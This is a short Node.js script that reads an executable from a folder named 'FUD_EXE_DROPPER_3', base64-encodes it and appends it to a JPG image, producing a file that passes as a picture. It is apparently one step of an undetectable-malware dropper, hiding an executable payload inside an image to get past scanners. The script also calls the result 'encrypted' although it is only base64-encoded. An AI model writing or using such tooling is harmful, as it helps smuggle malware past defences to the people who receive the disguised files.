const fs = require('fs');
const path = require('path');

const exeFile = 'C:/Users/this1/Desktop/FUD_EXE_DROPPER_3/Random_Console.exe';
const imageFile = 'C:/Users/this1/Desktop/FUD_EXE_DROPPER_3/nate.jpg';
const outputFile = 'encrypted_image.jpg';

const exeData = fs.readFileSync(exeFile);
const imageData = fs.readFileSync(imageFile);

const base64EncodedExe = exeData.toString('base64');

const imageDataWithExe = Buffer.concat([imageData, Buffer.from('\n' + base64EncodedExe)]);

fs.writeFileSync(outputFile, imageDataWithExe);

console.log(`The encrypted image file ${outputFile} has been created.`);
